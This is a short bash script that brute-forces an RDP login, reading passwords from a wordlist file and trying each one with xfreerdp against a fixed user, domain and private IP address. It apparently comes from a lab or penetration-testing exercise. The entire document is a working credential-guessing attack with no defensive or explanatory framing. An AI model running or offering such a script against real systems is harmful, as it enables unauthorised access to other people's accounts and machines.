#!/bin/bash

for pass in $(cat wl-ssh.txt):
do
	echo "Testando senha: $pass"
	xfreerdp /u:rogerio /p:$pass /d:gbusiness /v:172.16.1.5
done